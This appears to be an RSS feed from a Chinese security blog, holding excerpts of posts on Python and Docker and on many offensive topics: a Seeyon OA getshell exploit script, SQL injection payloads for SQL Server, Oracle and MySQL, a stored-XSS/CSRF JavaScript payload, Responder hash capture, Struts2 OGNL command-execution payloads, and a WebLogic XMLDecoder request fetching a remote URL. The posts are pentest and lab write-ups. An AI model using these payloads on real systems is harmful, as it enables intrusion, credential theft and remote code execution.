<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title></title>
    <link>http://wyb0.com/</link>
    <description>Recent content on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Thu, 04 Jul 2019 18:09:49 +0800</lastBuildDate>
    
	<atom:link href="http://wyb0.com/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Python 的协程</title>
      <link>http://wyb0.com/posts/2019/python-coroutine/</link>
      <pubDate>Thu, 04 Jul 2019 18:09:49 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2019/python-coroutine/</guid>
      <description>0x00 协程的优势 协程拥有极高的执行效率，因为子程序切换不是线程切换，而是由程序自身控制，因此没有线程切换的开销。和多线程比，线程数量越多，协程的性能优势就越明显。
不需要多线程的锁机制，因为只有一个线程，也不存在同时写变量冲突，在协程中控制共享资源不加锁，只需要判断状态就好了，所以执行效率比多线程高很多
0x01 Python中的协程 协程也就是微线程，python 的 generator(生成器) 中的 yield 可以一定程度上实现协程
在 generator 中，我们不但可以通过 for 循环来迭代，还可以不断调用 next() 函数获取由 yield 语句返回的下一个值。
但是 Python 的 yield 不但可以返回一个值，它还可以接收调用者发出的参数。 0x02 使用 gevent python 中可以通过 generator 实现协程，但是不完全，第三方的 gevent 为 Python 提供了比较完善的协程支持，gevent 可以通过 monkey patch 动态的修改 Python 自带的一些标准库
由于 IO 操作(比如访问网络)非常耗时，经常使程序处于等待状态，而 gevent 可以为我们自动切换协程，再在适当的时候切换回来继续执行，这就保证总有 greenlet 在运行，而不是等待 IO
使用 gevent 可以获得极高的并发性能，但 gevent 只能在 Unix/Linux 下运行，在 Windows 下不保证正常安装和运行 下面 3 个网络操作是并发执行的，且结束顺序不同，但只有一个线程
from gevent import monkey; monkey.patch_all() import requests import gevent def get_resp_size(url): print(&#39;GET: %s&#39; % url) html = requests.</description>
    </item>
    
    <item>
      <title>致远 OA A8 协同管理软件 getshell POC&amp;EXP</title>
      <link>http://wyb0.com/posts/2019/seeyon_getshell/</link>
      <pubDate>Sat, 29 Jun 2019 17:57:32 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2019/seeyon_getshell/</guid>
      <description>0x00 影响版本  致远A8-V5协同管理软件 V6.1sp1 致远A8+协同管理软件 V7.0、V7.0sp1、V7.0sp2、V7.0sp3 致远A8+协同管理软件 V7.1  0x01 查看接口看是否存在漏洞 如果查看 &amp;quot;seeyon/htmlofficeservlet&amp;quot; 接口，出现如下内容则表示存在漏洞 0x02 POC &amp;amp; EXP #!/usr/bin/env python # -*- coding: utf-8 -*- import time import random import string import requests info = { &amp;quot;name&amp;quot;: &amp;quot;致远 A8 可 getshell&amp;quot;, &amp;quot;author&amp;quot;: &amp;quot;reber&amp;quot;, &amp;quot;version&amp;quot;: &amp;quot;致远A8-V5协同管理软件V6.1sp1、致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3、V7.1&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;file_upload&amp;quot;, &amp;quot;level&amp;quot;: &amp;quot;high&amp;quot;, &amp;quot;result&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;status&amp;quot;: False, &amp;quot;references&amp;quot;: &amp;quot;&amp;lt;url&amp;gt;&amp;quot;, &amp;quot;desc&amp;quot;: &amp;quot;&amp;lt;vul describtion&amp;gt;&amp;quot;, } def assign(service, arg): if service == &#39;seeyon&#39;: return True, arg def encode(origin_bytes): &amp;quot;&amp;quot;&amp;quot; 重构 base64 编码函数 &amp;quot;&amp;quot;&amp;quot; # 将每一位bytes转换为二进制字符串 base64_charset = &amp;quot;gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6&amp;quot; base64_bytes = [&#39;{:0&amp;gt;8}&#39;.</description>
    </item>
    
    <item>
      <title>从 SQL Server 注入到 getshell</title>
      <link>http://wyb0.com/posts/2019/sql-server-from-injection-to-getshell/</link>
      <pubDate>Sat, 02 Mar 2019 20:23:35 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2019/sql-server-from-injection-to-getshell/</guid>
      <description>0x00 目标情况  一个web站点111.*.*.63，只有一个登陆框，测试了没有注入，没有弱口令 扫描了全端口，没有发现什么有用的信息  0x01 发现注入 当时是查看网页源代码，有两个可疑接口，一个是初始化密码借口，访问返回空白页面，没有什么用
另一个是密码设置接口，不过这个接口是同网段的另一个ip 111.*.*.59，访问后发现是个重置密码的界面 但是进行密码重置的时候需要发送验证码，系统会先校验用户名是否存在，加单引号出错，and 1=2没反应
burpsuite抓包后sqlmap跑了下，python sqlmap.py -r 1.txt，存在注入 通过sqlmap得到了这几个数据库
[*] HSOA_20170320 [*] HSOA_NEW [*] HSOA_T [*] master [*] model [*] msdb [*] Shuttle [*] SHWT [*] tempdb  0x02 找网站绝对路径  判断是不是dba权限(延时后返回正确页面，确定为dba权限&amp;lt;也可用sqlmap的&amp;ndash;is-dba判断&amp;gt;)  uname=test&#39;;if(1=(select is_srvrolemember(&#39;sysadmin&#39;))) WAITFOR DELAY &#39;0:0:2&#39;;--   判断是否是站库分离(延时后返回正确页面，确定站库没有分离)  uname=test&#39;;if(host_name()=@@servername) WAITFOR DELAY &#39;0:0:5&#39;;--   查看是否有xp_cmdshell  uname=test&#39;;if(1=(select count(*) from master.dbo.sysobjects where xtype = &#39;x&#39; and name = &#39;xp_cmdshell&#39;)) WAITFOR DELAY &#39;0:0:2&#39;--  恢复／删除xp_cmdshell exec sp_addextendedproc xp_cmdshell,@dllname=&#39;xplog70.</description>
    </item>
    
    <item>
      <title>SQL注入tips(Oracle)</title>
      <link>http://wyb0.com/posts/2019/injection-tips-of-oracle/</link>
      <pubDate>Fri, 04 Jan 2019 20:23:35 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2019/injection-tips-of-oracle/</guid>
      <description>0x00 判断数据库类型  Oracle有一些自带的表：dual、user_tables
 id=45 and (select count(*) from user_tables)&amp;gt;0-- id=45 and (select count(*) from dual)&amp;gt;0--  利用自带的一些函数：譬如utl_http.request 这些
 利用Oracle的字符连接符：CHR(97)||CHR(110)||CHR(100)||CHR(32)||CHR(49)||CHR(61)||CHR(49)
  0x01 基本信息获取  查看sid
select instance_name from v$instance;  查看数据库版本：
select banner from v$version where rownum=1; select banner from sys.v_$version where rownum=1;  查看用户：
select user from dual; --当前用户 select username from user_users; --当前用户 select username from all_users; --查看所有用户 select username from dba_users; --查看所有用户(需要有权限)  查看当前用户角色：</description>
    </item>
    
    <item>
      <title>Oracle数据库简单使用</title>
      <link>http://wyb0.com/posts/2018/oracle-database/</link>
      <pubDate>Tue, 25 Dec 2018 23:34:56 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2018/oracle-database/</guid>
      <description>0x00 关于Oracle  完整的Oracle数据库通常由两部分组成：Oracle数据库和数据库实例。 数据库是一系列物理文件的集合（数据文件，控制文件，联机日志，参数文件等） Oracle数据库实例则是一组Oracle后台进程/线程以及在服务器分配的共享内存区 关于部分视图  DBA/ALL/USER/V_$/GV_$/SESSION/INDEX开头的绝大部分都是视图 DBA_TABLES意为DBA拥有的或可以访问的所有的关系表。 ALL_TABLES意为某一用户拥有的或有权限访问的所有的关系表。 USER_TABLES意为某一用户所拥有的所有的关系表。 当某一用户本身就为数据库DBA时，DBA_TABLES与ALL_TABLES等价。 DBA_TABLES &amp;gt;= ALL_TABLES &amp;gt;= USER_TABLES   0x01 关于实例  在启动Oracle数据库服务器时，实际上是在服务器的内存中创建一个Oracle实例（即在服务器内存中分配共享内存并创建相关的后台内存） 我们访问Oracle都是访问一个实例，通过Oracle数据库实例来访问和控制磁盘中的数据文件 Oracle实例如果关联了数据库文件，就是可以访问的，如果没有，就会得到实例不可用的错误 实例名指的是用于响应某个数据库操作的数据库管理系统的名称，它同时也叫SID，连接数据库时就会用到这个SID，如：jdbc:oracle:thin:@localhost:1521:orcl（orcl就为数据库实例名）  0x02 关于表空间(可以理解为mysql中的数据库)  Oracle数据库是通过表空间来存储物理表的，一个数据库实例可以有N个表空间，一个表空间下可以有N张表。 用户和表空间是多对多的关系，但是一般创建用户时会指定一个默认表空间。 表空间是数据库中最大的逻辑单位，一个表空间可以包含多个数据文件，而一个数据文件只能隶属一个表空间。  0x03 搭建Oracle环境 使用docker拉取Oracle数据库并且运行
[23:36 reber@wyb in ~] ➜ docker pull alexeiled/docker-oracle-xe-11g [23:36 reber@wyb in ~] ➜ docker run --rm -tid --shm-size=2g -p 1521:1521 -p 8080:8080 alexeiled/docker-oracle-xe-11g  然后在www.oracle.com下载链接Oracle的客户端：instantclient-basic-macos、instantclient-sqlplus-macos
[15:41 reber@wyb in ~/Downloads] ➜ unzip instantclient-basic-macos.</description>
    </item>
    
    <item>
      <title>记一次SQL Server报错注入</title>
      <link>http://wyb0.com/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/</link>
      <pubDate>Mon, 24 Dec 2018 10:51:02 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/</guid>
      <description>0x00 验证码前端验证 需要测试一个网站，刚开始看到网站时感觉希望不大，因为验证码是需要拖动的，这也就意味着很大可能没办法爆破，另一方面是都用这种验证码了，安全做的能很差劲吗？果然，试了admin、123456之类的都不行 那就抓个包吧 emmmmmm。 32位，md5加密？这里看着没有验证码之类的信息，把这个包发了几次发现没有出现验证码信息，而且试了试，发现有两种状态(运气比较好，有admin这个用户，我也是试的这个用户，一下子就看出返回不同了)，如下：
用户不存在时返回 {&amp;quot;iserror&amp;quot;:true,&amp;quot;message&amp;quot;:&amp;quot;用户名不存在！&amp;quot;,&amp;quot;data&amp;quot;:null,&amp;quot;errorfieldlist&amp;quot;:null}
用户名存在时返回 {&amp;quot;iserror&amp;quot;:true,&amp;quot;message&amp;quot;:&amp;quot;密码不正确！&amp;quot;,&amp;quot;data&amp;quot;:null,&amp;quot;errorfieldlist&amp;quot;:null}
可以的，验证码前端验证，我觉得可以burp抓包intruder一下
跑了top 500的用户名和top 1000的密码，除了直接试的用户名admin，其他的一个都没有跑出来 sad
0x01 存在注入 嗯看来爆破是基本没有希望了，测其他的吧，嗯，这里是登陆，那肯定要看注入的，无脑加单引号，boom！ 可以的，and 1=1 有注入
哎？？！！！那不对啊，咋的后台还解密md5后进行查询？？
刚才看了数据包，用户名密码都是32位，猜想sql语句是：select password from user where username=name_md5_hash，然后判断用户存不存在之类的
看返回信息的话显然不是啊，哪有后台解密md5后查询的。。。。。。
试试post其他用户名和密码，然后看数据包 显然并不是md5。。。。 这个是前端加密后发送的。。。。。看一下js，结果发现了这个 emmmmm，想了想，应该可以注入的，看看啥系统 大概率SQL Server了(因为前几天在t00ls刚看到了一个ASP.NET+MySQL，比较任性)，所以这里看一下，发现确实是SQL Server 看看数据库版本，嗯，看来还是报错注入 可以可以，看看有几列，然后进行union注入 一列，这里也能大致猜出来sql语句了，估计就是：select password from user where username=&#39;admin&#39;
那就看看数据库吧，不知道SQL Server中的concat怎么用，一个个来吧。。。。
得到第一个数据库的名字：union select name from master.dbo.sysdatabases where dbid=1 得到第二个数据库的名字：union select name from master.dbo.sysdatabases where dbid=2 得到第5个数据库的名字：union select name from master.dbo.sysdatabases where dbid=5 好麻烦啊，拖一下验证码，然后得到一个数据库，而且后面还有表呢。。。。。
py一下了吧，前端有js进行加密，可以本地写文件生成加密后的payload，然后python拿到payload后进行注入</description>
    </item>
    
    <item>
      <title>使用docker-compose构造LAMP环境</title>
      <link>http://wyb0.com/posts/2018/docker-compose-build-lamp/</link>
      <pubDate>Sat, 15 Dec 2018 22:51:04 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2018/docker-compose-build-lamp/</guid>
      <description>0x00 实现功能 使用docker-compose构造LAMP环境，其中mysql数据库、mysql配置文件、网站文件均持久化存储到本机。
apache、php通过Dockerfile构造，Dockerfile拉取ubuntu镜像，然后安装apache2和php。
mysql的话通过docker的links连接mysql:5.5这个镜像当作数据库。
具体文件参见：https://github.com/reber0/docker_env
0x01 文件构造 ➜ tree apache apache ├── Dockerfile ├── conf │ └── my.cnf ├── docker-compose.yml ├── mysql ├── src │ ├── init.sh │ └── sources.list └── web └── index.php 4 directories, 6 files  0x02 docker-compose.yml version: &#39;3&#39; services: apache: image: ubuntu:apache #镜像名为ubuntu，tag为apache container_name: apache #运行后生成的容器名字为apache build: . #使用当前路径下的Dockerfile构造镜像 ports: - &amp;quot;81:80&amp;quot; volumes: - ./www:/var/www/html links: - mymysql environment: #设置环境变量 - TZ=Asia/Shanghai #设定时区 restart: always #容器重启策略：当容器终止退出后，总是重启容器，默认策略。 mymysql: image: mysql:5.</description>
    </item>
    
    <item>
      <title>Docker之Docker Compose</title>
      <link>http://wyb0.com/posts/2018/docker-compose/</link>
      <pubDate>Mon, 19 Nov 2018 20:10:23 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2018/docker-compose/</guid>
      <description>0x00 关于docker compose 可以把docker-compose当作docker命令的封装，它是一个用来把 docker 自动化的东西，docker-compose可以一次性管理多个容器，通常用于需要多个容器相互配合来完成某项任务的场景。
0x01 安装与卸载 https://docs.docker.com/compose/install
0x02 一些常用命令  构建容器：docker-compose up -d 启动容器：docker-compose start 停止容器：docker-compose stop 重启容器：docker-compose restart kill容器：docker-compose kill 删除容器：docker-compose rm bash连接容器：docker-compose exec [services_name] bash 执行一条命令：docker-compose run [services_name] [command]  0x03 docker-compose简单应用  结构
. ├── Dockerfile ├── docker-compose.yml └── src ├── app.py └── sources.list 1 directory, 4 files  Dockerfile
FROM ubuntu:14.04.4 MAINTAINER reber &amp;lt;1070018473@qq.com&amp;gt; COPY ./src /code #将data挂载到容器的code WORKDIR /code RUN cp sources.list /etc/apt/sources.</description>
    </item>
    
    <item>
      <title>记一次渗透测试中利用存储型XSS添加用户</title>
      <link>http://wyb0.com/posts/2018/recording-an-xss-in-pentest/</link>
      <pubDate>Wed, 14 Nov 2018 10:36:38 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2018/recording-an-xss-in-pentest/</guid>
      <description>0x00 简单查看 拿到目标后简单看了下，是一个类似员工管理的东西，用户可以创建group，其他用户可以搜索这个group然后申请加入
每个账号都可以注册组织，然后让别人加入，加入的用户有创建者、管理员、默认成员3个角色，管理员拥有的权限就比较大了，可以查看通讯录、添加成员、删除成员等等
0x01 申请加入组织流程分析 走了一遍流程，注册了两个账号，一个是reber，一个是yxk
在加入某组织时会让填验证信息，组织收到申请后同意然后把用户添加到某个分组然后确定
流程大概分4步，用户申请加入group、管理员点击同意、管理员关联用户到分组或成员、确定同意用户的申请
 用户reber搜索组织，然后提交验证消息  用户yxk在消息列表同意reber的申请  yxk给reber分组，点击下一步
 最后一步写入备注信息，点击同意按钮最终同意用户加入   0x02 请求链接分析 经过对上面流程的抓包分析测试，涉及到的有用请求有3个：管理员点击同意链接时的请求、关联到分组或成员的请求、确定同意的请求
 用户申请加入某group时发送的数据包如下：  API：/a/cms/org/applyorg POST：verification=11111&amp;amp;orgId=247173   group管理员同意用户申请时链接如下：  API：/a/cms/apply/handle-accept?id=6de027c0-9a4f-490e-a5e2-d1c76cd34a70&amp;amp;oid=247178&amp;amp;name=1760048****  这里链接里有一个id，经过抓包发现可以通过/a/cms/apply/applymsg这个接口直接得到同意申请时的链接
 将申请用户关联到分组或成员涉及到如下数据包：  API：/a/cms/apply/do.handle POST：ID=80b49e8f-4e8c-450f-8bf4-eb809271e779&amp;amp;OID=247178&amp;amp;GID=608863&amp;amp;MID=0&amp;amp;Agree=true&amp;amp;Reason=111  可以看到，上面的请求链接中都没有token，存在CSRF，就猜想能不能构造上述请求从而通过XSS和CSRF来做一些事情
0x03 构造直接添加用户到group的js 由于cookie设置了httponly，不能获取到完整的cookie，所以这里尝试写js代码，实现将用户直接加入group的功能
看了上面的请求包分析后发现，如果要构造数据包实现我们的想法的话需要有：ID、OID、GID这3个id
分析后发现在/a/cms/apply/applymsg请求的返回包中有同意的链接，链接中有ID
分析后发现在/a/cms/group/treeNode请求的返回包中有OID和GID
于是用于XSS的1.js内容构造如下：
//因为这里要把ajax的返回值return到函数中，需要是同步请求，所以async要设为false function get_agree_url(){//得到管理员同意用户申请的链接 var agree_url; var href; $.ajax({ type: &#39;get&#39;, url: &#39;/a/cms/apply/applymsg&#39;, async: false, success: function(data){ $(data).find(&#39;#accept&#39;).each(function(index,element){ href = $(this).attr(&#39;href&#39;); if (/id=.</description>
    </item>
    
    <item>
      <title>内网渗透之Responder与Net-NTML hash</title>
      <link>http://wyb0.com/posts/2018/responder-and-ntml-hash/</link>
      <pubDate>Mon, 10 Sep 2018 09:48:10 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2018/responder-and-ntml-hash/</guid>
      <description>0x00 一些概念  Windows认证协议
分为：基于NTML的认证和基于kerberos的认证
 什么是NTLM Hash？
早期IBM设计的LM Hash算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即NTLM Hash
 什么是Challenge-Response挑战/响应验证机制？
 Client输入username、password、domain，然后将用户名及密码hash后存在本地，并将username发送到 DC DC生成一个16字节的随机数，即Challenge(挑战码)，然后传回Client Client收到Challenge后将密码hash和challenge混合hash，混合后的hash称为response，然后将challenge、response和username发送给Server Server将收到的3个值转发给DC，然后DC根据传过来的username到域控的账号数据库ntds.list找到对应的密码hash，将hash和Client传过来的challenge混合hash，将这个混合hash与Client传过来的response进行对比验证  NTLM Hash与Net-NTLM Hash
 NTLM Hash通常是指Windows系统下Security Account Manager中保存的用户密码hash，通常可从Windows系统中的SAM文件和域控的NTDS.dit文件中获得所有用户的hash（比如用Mimikatz提取），“挑战/响应验证”中的用户名及密码hash就是NTLM Hash Net-NTLM Hash通常是指网络环境下NTLM认证中的hash，“挑战/响应验证”中的response中包含Net-NTLM hash，用Responder抓取的就是Net-NTLM Hash  关于Responder
由Laurent Gaffie撰写的 Responder 是迄今为止，在每个渗透测试人员用于窃取不同形式的证书（包括Net-NTLM hash）的最受欢迎的工具。它通过设置几个模拟的恶意守护进程（如SQL服务器，FTP，HTTP和SMB服务器等）来直接提示凭据或模拟质询 – 响应验证过程并捕获客户端发送的必要 hash。Responder也有能力攻击LLMNR，NBT-NS和mDNS等协议。
 什么是NTLM中继攻击？
攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。
  0x01 软件环境  可以从https://github.com/lgandx/Responder下载Responder 域内主机：Win7（10.11.11.20） 域控主机：Win2008（10.11.11.18） 被控主机：Ubuntu14.04（10.11.11.11）和目标机同一网段  0x02 通过SMB服务获取Net-NTLM hash 对于SMB协议，客户端在连接服务端时，默认先使用本机的用户名和密码hash尝试登录，所以可以模拟SMB服务器从而截获hash，执行如下命令都可以得到hash
net.exe use \\host\share attrib.exe \\host\share bcdboot.exe \\host\share bdeunlock.</description>
    </item>
    
    <item>
      <title>SQL注入tips(SQL Server)</title>
      <link>http://wyb0.com/posts/2018/injection-tips-of-sqlserver/</link>
      <pubDate>Tue, 04 Sep 2018 10:09:17 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2018/injection-tips-of-sqlserver/</guid>
      <description>0x00 基础信息探测 @@VERSION,@@SERVERNAME,@@SERVICENAME; --Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) --WIN-2008 --MSSQLSERVER USER,CURRENT_USER,SESSION_USER,SYSTEM_USER; --dbo --dbo --dbo --sa USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME(); --dbo --wyb --46530 --sa USER_ID(),USER_SID(); --1 --&amp;lt;01&amp;gt; ORIGINAL_LOGIN(); --sa  0x01 UNION query &amp;amp; error-based 注入  判断存在注入  and 1=1/and 1=2  select * from msg where id=1 and 11=(select case when(1=1) then 11 else 2 end); select * from msg where id=1 and 11=(select case when(1=2) then 11 else 2 end);   判断是否为sa权限  select name from msg where id=1 and 1=convert(int,(select is_srvrolemember(&#39;sysadmin&#39;)));   得到所有数据库名字 --报错得到数据库名，前6个是系统自带的数据库，所以从第7个开始，dbid依次增加即可得到所有数据库 select id,name from msg where id=1 and 0&amp;lt;&amp;gt;(select name from master.</description>
    </item>
    
    <item>
      <title>关于PHP SESSION反序列化</title>
      <link>http://wyb0.com/posts/2018/php-session-unserialize/</link>
      <pubDate>Mon, 23 Jul 2018 00:09:17 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2018/php-session-unserialize/</guid>
      <description>0x00 环境 公司出了一些ctf，说要摸底，然后根据答题成绩来分配相应工作。。。。。
其中有一道是php反序列化，直接用的就是 第三届4.29“安恒杯”网络安全技术大赛初赛第三个web题
我比较菜，这里根据网上已有writeup做了一遍，这里记录一下。。。。
reber@wyb:~$ html cat /proc/version Linux version 4.4.0-31-generic (buildd@lgw01-43) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3) ) #50~14.04.1-Ubuntu SMP Wed Jul 13 01:07:32 UTC 2016 reber@wyb:~$ html php --version PHP 5.5.9-1ubuntu4.21 (cli) (built: Feb 9 2017 20:54:58) Copyright (c) 1997-2014 The PHP Group Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies reber@ubuntu-linux:~$ apachectl -v Server version: Apache/2.</description>
    </item>
    
    <item>
      <title>Struts 2相关漏洞payload</title>
      <link>http://wyb0.com/posts/2018/structs2-some-vulnerability-payload/</link>
      <pubDate>Mon, 25 Jun 2018 21:26:14 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2018/structs2-some-vulnerability-payload/</guid>
      <description>0x00 S2-001 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。  %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&amp;quot;whoami&amp;quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&amp;quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}  0x01 S2-005 影响版本: 2.0.0 - 2.1.8.1
http://aa.com/index.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;amp;(asdf)((&#39;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&#39;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1  0x02 S2-007 影响版本: 2.0.0 - 2.2.3
当配置了验证规则 &amp;lt;ActionName&amp;gt;-validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。  &#39; + (#_memberAccess[&amp;quot;allowStaticMethodAccess&amp;quot;]=true,#foo=new java.lang.Boolean(&amp;quot;false&amp;quot;) ,#context[&amp;quot;xwork.MethodAccessor.denyMethodExecution&amp;quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())) + &#39;  0x03 S2-012 影响版本: 2.1.0 - 2.3.13
这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。  %{#a=(new java.lang.ProcessBuilder(new java.</description>
    </item>
    
    <item>
      <title>SQL注入tips(MySQL)</title>
      <link>http://wyb0.com/posts/2018/injection-tips-of-mysql/</link>
      <pubDate>Wed, 23 May 2018 11:14:51 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2018/injection-tips-of-mysql/</guid>
      <description>环境：MySQL 5.5.47
0x00 注入点在Order by后面 mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by id into outfile &#39;C:\\Apps\\phpStudy\\WWW\\a.txt&#39;; Query OK, 1 row affected (0.01 sec)  mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),0x7e),1); ERROR 1105 (HY000): XPATH syntax error: &#39;~msg~&#39;  mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by name procedure analyse(updatexml(1,concat(0x7e,database(),0x7e),1),1); ERROR 1105 (HY000): XPATH syntax error: &#39;~rtest~&#39;  mysql&amp;gt; select name from msg where id&amp;gt;1 order by if(1=1,1,(select 1 union select 2)); +----------+ | name | +----------+ | xiaohong | +----------+ 1 row in set (0.</description>
    </item>
    
    <item>
      <title>ThinkPHP5的where函数</title>
      <link>http://wyb0.com/posts/2018/thinkphp5-where-function/</link>
      <pubDate>Mon, 16 Apr 2018 19:16:14 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2018/thinkphp5-where-function/</guid>
      <description>0x00 关于thinkphp5的where函数 年前公司委托别的公司开发一个网站，使用的是ThinkPHP 5.0.13，存在一个注入漏洞，分析后发现是因为tp5中的where函数使用不当，tp5中where这个函数可以接收字符串和数组这两种类型的参数来进行查询，而在用字符串这种传递方式时，如果使用不当的话就可能会出现sql注入。
0x01 示例代码 tp5/application/home/controller/Index.php
&amp;lt;?php namespace app\home\controller; use think\Db; class Index { //http://127.0.0.1/Source/tp5/home/index/testdb/id/1 public function testDb() { // 调用 tp5/thinkphp/library/think/Db.php 的 connect() 函数 初始化数据库，并取得数据库类实例 $msg = db(&#39;msg&#39;); $id = input(&#39;param.id&#39;,1); //不存在id的话默认为1 //在Db.php中use think\db\Query; $msg-&amp;gt;where()则调用了Query.php中的where函数进入查询流程 $result = $msg-&amp;gt;where(&amp;quot;id=&amp;quot;.$id)-&amp;gt;select(); // $result = $msg-&amp;gt;where([&#39;id&#39;=&amp;gt;$id])-&amp;gt;select(); echo &#39;&amp;lt;br/&amp;gt;&amp;lt;hr/&amp;gt;执行的sql语句：&#39;; echo $msg-&amp;gt;getLastSql(); echo &#39;&amp;lt;br/&amp;gt;最终得到的结果：&#39;; echo var_dump($result); } }  where函数接收字符串和数组时，访问http://127.0.0.1/Source/tp5/home/index/testdb/id/1执行的SQL语句分别如下：
SELECT * FROM `msg` WHERE ( id=1 ) SELECT * FROM `msg` WHERE `id` = 1  前者存在注入，当payload为: ) and 1=1 and (1)=(1时判断返回如下： 主要调用文件及函数顺序如下：</description>
    </item>
    
    <item>
      <title>WebLogic &#39;wls-wsat&#39; XMLDecoder 反序列化漏洞</title>
      <link>http://wyb0.com/posts/2018/cve-2017-10271/</link>
      <pubDate>Fri, 09 Mar 2018 09:20:03 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2018/cve-2017-10271/</guid>
      <description>0x00 WebLogic WLS组件反序列化漏洞 这个漏洞的编号是CVE-2017-10271，是利用Oracle WebLogic中 wls-wsat 组件的反序列化漏洞进行远程代码执行的，版本号 &amp;lt; 10.3.6 的都受到影响，刚出来时没有看，现在记录一下
漏洞环境：https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271
0x01 访问远程文件 POST /wls-wsat/CoordinatorPortType HTTP/1.1 Host: 127.0.0.1:7001 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: JSESSIONID=DJbghZRGlJf0PyyLc52n4GdvrbDkrxKWGDpwnncFpHnqsDjMT68F!-298356074 Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Length: 688 Content-Type: text/xml &amp;lt;soapenv:Envelope xmlns:soapenv=&amp;quot;http://schemas.xmlsoap.org/soap/envelope/&amp;quot;&amp;gt; &amp;lt;soapenv:Header&amp;gt; &amp;lt;work:WorkContext xmlns:work=&amp;quot;http://bea.com/2004/06/soap/workarea/&amp;quot;&amp;gt; &amp;lt;java version=&amp;quot;1.8&amp;quot; class=&amp;quot;java.beans.XMLDecoder&amp;quot;&amp;gt; &amp;lt;object id=&amp;quot;url&amp;quot; class=&amp;quot;java.net.URL&amp;quot;&amp;gt; &amp;lt;string&amp;gt;http://114.115.123.123:80/aaaaaaa&amp;lt;/string&amp;gt; &amp;lt;/object&amp;gt; &amp;lt;object idref=&amp;quot;url&amp;quot;&amp;gt; &amp;lt;void id=&amp;quot;stream&amp;quot; method = &amp;quot;openStream&amp;quot; /&amp;gt; &amp;lt;/object&amp;gt; &amp;lt;/java&amp;gt; &amp;lt;/work:WorkContext&amp;gt; &amp;lt;/soapenv:Header&amp;gt; &amp;lt;soapenv:Body/&amp;gt; &amp;lt;/soapenv:Envelope&amp;gt;  0x02 写入文件 POST /wls-wsat/CoordinatorPortType HTTP/1.</description>
    </item>
    
    <item>
      <title>Metasploit简单提权</title>
      <link>http://wyb0.com/posts/2018/msf-simple-elevate-privileges/</link>
      <pubDate>Mon, 26 Feb 2018 13:43:20 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2018/msf-simple-elevate-privileges/</guid>
      <description>0x00 前提 虚拟机有一个shell：http://10.11.11.20/a.php，物理机IP是211.222.222.72
外网安装msf的主机：外网IP是114.115.123.123，内网IP是192.168.0.195
